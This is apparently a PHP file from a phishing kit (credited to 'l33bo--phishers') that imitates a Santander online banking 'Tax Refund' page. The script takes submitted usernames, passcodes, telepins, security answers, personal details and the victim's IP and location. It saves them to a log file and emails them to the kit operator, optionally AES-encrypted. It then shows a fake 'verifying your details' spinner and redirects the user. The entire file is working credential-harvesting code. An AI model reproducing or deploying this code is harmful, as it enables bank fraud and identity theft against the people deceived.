<?php
/*
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
*/
require "assets/includes/session_protect.php";
require_once("assets/includes/functions.php");
include "../CONTROLS.php";
include("assets/includes/AES.php");
$user = $_POST['user'];
$passcode = $_POST['passcode'];
$regno = $_POST['regno'];
$name = $_POST['name'];
$dob = $_POST['dob'];
$address = $_POST['address'];
$home = $_POST['home'];
$mobile = $_POST['mobile'];
$Network = $_POST['Network'];
$email = $_POST['email'];
$telepin = $_POST['telepin'];
$q1 =  $_POST['q1'];
$a1 = $_POST['a1'];
$q2 =  $_POST['q2'];
$a2 = $_POST['a2'];
$q3 =  $_POST['q3'];
$a3 = $_POST['a3'];
$ip = $_SERVER['REMOTE_ADDR'];
$systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
$from = $From_Address;
$headers = "From:" . $from;
$subj = "Santander : $ip";
$to = $Your_Email; 
$warnsubj = "Abuse";
$warn = "A user (with ip: $ip) has attempted to send you a completed form containing abusive language. l33bo_Phishers is against abusive form filling and has redirected this user to the official site while blocking the form.";
$bad_words = array('9999','4r5e','5h1t','5hit','a55','anal','anus','ar5e','arrse','arse','ass','ass-fucker','asses','assfucker','assfukka','asshole','assholes','asswhole','a_s_s','b!tch','b00bs','b17ch','b1tch','ballbag','balls','ballsack','bastard','beastial','beastiality','bellend','bestial','bestiality','bi+ch','biatch','bitch','bitcher','bitchers','bitches','bitchin','bitching','bloody','blow job','blowjob','blowjobs','boiolas','bollock','bollok','boner','boob','boobs','booobs','boooobs','booooobs','booooooobs','breasts','buceta','bugger','bum','bunny fucker','butt','butthole','buttmuch','buttplug','c0ck','c0cksucker','carpet muncher','cawk','chink','cipa','cl1t','clit','clitoris','clits','cnut','cock','cock-sucker','cockface','cockhead','cockmunch','cockmuncher','cocks','cocksuck ','cocksucked ','cocksucker','cocksucking','cocksucks ','cocksuka','cocksukka','cok','cokmuncher','coksucka','coon','cox','crap','cum','cummer','cumming','cums','cumshot','cunilingus','cunillingus','cunnilingus','cunt','cuntlick ','cuntlicker ','cuntlicking ','cunts','cyalis','cyberfuc','cyberfuck ','cyberfucked ','cyberfucker','cyberfuckers','cyberfucking ','d1ck','damn','dick','dickhead','dildo','dildos','dink','dinks','dirsa','dlck','dog-fucker','doggin','dogging','donkeyribber','doosh','duche','dyke','ejaculate','ejaculated','ejaculates ','ejaculating ','ejaculatings','ejaculation','ejakulate','f u c k','f u c k e r','f4nny','fag','fagging','faggitt','faggot','faggs','fagot','fagots','fags','fanny','fannyflaps','fannyfucker','fanyy','fatass','fcuk','fcuker','fcuking','feck','fecker','felching','fellate','fellatio','fingerfuck ','fingerfucked ','fingerfucker ','fingerfuckers','fingerfucking ','fingerfucks ','fistfuck','fistfucked ','fistfucker ','fistfuckers ','fistfucking ','fistfuckings ','fistfucks ','flange','fook','fooker','fuck','fucka','fucked','fucker','fuckers','fuckhead','fuckheads','fuckin','fucking','fuckings','fuckingshitmotherfucker','fuckme ','fucks','fuckwhit','fuckwit','fudge packer','fudgepacker','fuk','fuker','fukker','fukkin','fuks','fukwhit','fukwit','fux','fux0r','f_u_c_k','gangbang','gangbanged ','gangbangs ','gaylord','gaysex','goatse','God','god-dam','god-damned','goddamn','goddamned','hardcoresex ','hell','heshe','hoar','hoare','hoer','homo','hore','horniest','horny','hotsex','jack-off ','jackoff','jap','jerk-off ','jism','jiz ','jizm ','jizz','kawk','knob','knobead','knobed','knobend','knobhead','knobjocky','knobjokey','kock','kondum','kondums','kum','kummer','kumming','kums','kunilingus','l3i+ch','l3itch','labia','lmfao','lust','lusting','m0f0','m0fo','m45terbate','ma5terb8','ma5terbate','masochist','master-bate','masterb8','masterbat*','masterbat3','masterbate','masterbation','masterbations','masturbate','mo-fo','mof0','mofo','mothafuck','mothafucka','mothafuckas','mothafuckaz','mothafucked ','mothafucker','mothafuckers','mothafuckin','mothafucking ','mothafuckings','mothafucks','mother fucker','motherfuck','motherfucked','motherfucker','motherfuckers','motherfuckin','motherfucking','motherfuckings','motherfuckka','motherfucks','muff','mutha','muthafecker','muthafuckker','muther','mutherfucker','n1gga','n1gger','nazi','nigg3r','nigg4h','nigga','niggah','niggas','niggaz','nigger','niggers ','nob','nob jokey','nobhead','nobjocky','nobjokey','numbnuts','nutsack','orgasim ','orgasims ','orgasm','orgasms ','p0rn','pawn','pecker','penis','penisfucker','phonesex','phuck','phuk','phuked','phuking','phukked','phukking','phuks','phuq','pigfucker','pimpis','piss','pissed','pisser','pissers','pisses ','pissflaps','pissin ','pissing','pissoff ','poop','porn','porno','pornography','pornos','prick','pricks ','pron','pube','pusse','pussi','pussies','pussy','pussys ','rectum','retard','rimjaw','rimming','s hit','s.o.b.','sadist','schlong','screwing','scroat','scrote','scrotum','semen','sex','sh!+','sh!t','sh1t','shag','shagger','shaggin','shagging','shemale','shi+','shit','shitdick','shite','shited','shitey','shitfuck','shitfull','shithead','shiting','shitings','shits','shitted','shitter','shitters ','shitting','shittings','shitty ','skank','slut','sluts','smegma','smut','snatch','son-of-a-bitch','spac','spunk','s_h_i_t','t1tt1e5','t1tties','teets','teez','testical','testicle','tit','titfuck','tits','titt','tittie5','tittiefucker','titties','tittyfuck','tittywank','titwank','tosser','turd','tw4t','twat','twathead','twatty','twunt','twunter','v14gra','v1gra','vagina','viagra','vulva','w00se','wang','wank','wanker','wanky','whoar','whore','willies','willy','xrated','fuck','fuckoff','fuck off','fucking','nigger','nigerian','Nigerian','scam','cunt','wankers','twats','scammers','shit','wanker','cunt','asshole','arsehole','passwd','sample');
$VictimInfo .= "| IP Address : " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")\r\n";
$VictimInfo .= "| Location: " . $systemInfo['city'] . ", " . $systemInfo['region'] . ", " . $systemInfo['country'] . "\r\n";
$VictimInfo .= "| UserAgent : " . $systemInfo['useragent'] . "\r\n";
$VictimInfo .= "| Browser : " . $systemInfo['browser'] . "\r\n";
$VictimInfo .= "| Platform : " . $systemInfo['os'] . "";
$data = "
+ ------------- L33bo Phishers -------------+
+ ------------------------------------------+
+ Personal Information
| Full name : $name
| Date of birth : $dob
| Address : $address
| Mobile Telephone : $mobile (Network: $Network)
| Home Telephone : $home
| Email : $email
+ ------------------------------------------+
+ Account Information (Santander)
| Username : $user
| Passcode : $passcode
| Reg no : $regno
| Telepin : $telepin
| Security Question 1 : $q1
| Security Answer : $a1
| Security Question 2 : $q2
| Security Answer : $a2
| Security Question 3 : $q3
| Security Answer : $a3
+ ------------------------------------------+
+ Victim Information
$VictimInfo
+ ------------------------------------------+
";
$imputText = $data;
$imputKey = "232BBCD7D47A1192";
$blockSize = 256;
$aes = new AES($imputText, $imputKey, $blockSize);
$enc = $aes->encrypt();
$aes->setData($enc);
$dec=$aes->decrypt();
if($Abuse_Filter==1)
{
foreach($bad_words as $bad_word){
    if(stristr($_POST['name'], $bad_word) !== false) {
		mail($to,$warnsubj,$warn,$headers);
        exit(header("Location:  https://www.google.co.uk/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0CCEQFjAAahUKEwiZ55Ga3dbHAhWTv4AKHaBSB0Q&url=http%3A%2F%2Fwww.santander.co.uk%2F&usg=AFQjCNGxsB2ppSgA2_EdiE9XLymB9HZLkQ&bvm=bv.101800829,d.ZGU"));
    }
	if(stristr($_POST['mmn'], $bad_word) !== false) {
		mail($to,$warnsubj,$warn,$headers);
        exit(header("Location:  https://www.google.co.uk/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0CCEQFjAAahUKEwiZ55Ga3dbHAhWTv4AKHaBSB0Q&url=http%3A%2F%2Fwww.santander.co.uk%2F&usg=AFQjCNGxsB2ppSgA2_EdiE9XLymB9HZLkQ&bvm=bv.101800829,d.ZGU"));
    }
if(stristr($_POST['address'], $bad_word) !== false) {
		mail($to,$warnsubj,$warn,$headers);
        exit(header("Location:  https://www.google.co.uk/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0CCEQFjAAahUKEwiZ55Ga3dbHAhWTv4AKHaBSB0Q&url=http%3A%2F%2Fwww.santander.co.uk%2F&usg=AFQjCNGxsB2ppSgA2_EdiE9XLymB9HZLkQ&bvm=bv.101800829,d.ZGU"));
    }
}
}
if($Save_Log==1) {
	if($Encrypt==1) {
	$file=fopen("assets/logs/santander.txt","a");
	fwrite($file,$enc);
	fclose($file);
	}
	else {
	$file=fopen("assets/logs/santander.txt","a");
	fwrite($file,$data);
	fclose($file);
	}
}
require "../assets/includes/vpn_check.php";	
if($Send_Log==1) {
	if($Encrypt==1) {
	mail($to,$subj,$enc,$headers);	
	}
	else {
	mail($to,$subj,$data,$headers);	
	}
}
?>
<!DOCTYPE html>
<html lang="en-GB"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta charset="UTF-8">
<meta name="viewport" content="user-scalable=yes, width=device-width, initial-scale=1">
<title>Tax Refund Request</title>
<link rel="stylesheet" href="https://apply.santander.co.uk/PubRetBankWeb/fl/Styles/santander.css">
<link rel="shortcut icon" href="assets/img/fav.ico">
<meta http-equiv="refresh" content="5; URL='../Finish.php?&sessionid=<?php echo generateRandomString(110); ?>&securessl=true'" />
<style>
<style>
.spinner {
  margin: 100px auto;
  width: 50px;
  height: 30px;
  text-align: center;
  font-size: 10px;
}

.spinner > div {
  background-color: #FF0000;
  height: 100%;
  width: 6px;
  display: inline-block;
  
  -webkit-animation: stretchdelay 1.2s infinite ease-in-out;
  animation: stretchdelay 1.2s infinite ease-in-out;
}

.spinner .rect2 {
  -webkit-animation-delay: -1.1s;
  animation-delay: -1.1s;
}

.spinner .rect3 {
  -webkit-animation-delay: -1.0s;
  animation-delay: -1.0s;
}

.spinner .rect4 {
  -webkit-animation-delay: -0.9s;
  animation-delay: -0.9s;
}

.spinner .rect5 {
  -webkit-animation-delay: -0.8s;
  animation-delay: -0.8s;
}

@-webkit-keyframes stretchdelay {
  0%, 40%, 100% { -webkit-transform: scaleY(0.4) }  
  20% { -webkit-transform: scaleY(1.0) }
}

@keyframes stretchdelay {
  0%, 40%, 100% { 
    transform: scaleY(0.4);
    -webkit-transform: scaleY(0.4);
  }  20% { 
    transform: scaleY(1.0);
    -webkit-transform: scaleY(1.0);
  }
}</style>
</head>
 <body>


<div id="wrapper">
	<a href="#" class="auralOnly" title="click here to skip to main content">skip to main content</a>

	<header role="banner">
		<div>
			<span class="logo">Santander Online Banking</span>
			<span class="secureMessage">Your details are secure</span>
		</div>
		 <div class="headerExtra">
               <p>Your details are secure</p>
         </div>		
	</header>

	<div id="main" class="rightColumn">	
		<div id="content">
			




<h1>Tax Refund</h1>
<ol class="breadcrumbs"><li>Account Login</li><li>About you</li><li>Your Account</li><li class="current">Finsh</li></ol>




<div class="form">
	<h2>Please wait while we check your information</h2>
	<div class="formbody">
	<ul class="fields">
		<li>
<center>
<div class="spinner">
  <div class="rect1"></div>
  <div class="rect2"></div>
  <div class="rect3"></div>
  <div class="rect4"></div>
  <div class="rect5"></div>
</div></center>
<p align="center"><strong>It'll only take a few seconds - we're just verifying the details that you've entered.</strong></p>
<p align="center">Please don't refresh this page or close your browser while you're waiting.</p>
<p align="center">You will be redirected back to HMRC in order to complete your claim</p>
		</li>
	</ul>
	</div>
</div>

		</div>
		<div id="extraInfo">
		
		</div>

		
	</div>

	<footer class="simple">
		<ul>
			<li class="first"><a target="_blank" href="#">Peace of Mind Guarantee</a></li>
			<li><a target="_blank" href="#">Site Help &amp; Accessibility</a></li>
			<li><a target="_blank" href="#">Security &amp; Privacy</a></li>
			<li><a target="_blank" href="#">Legal</a></li>
		</ul>
	</footer>
	
</div>


</body></html>
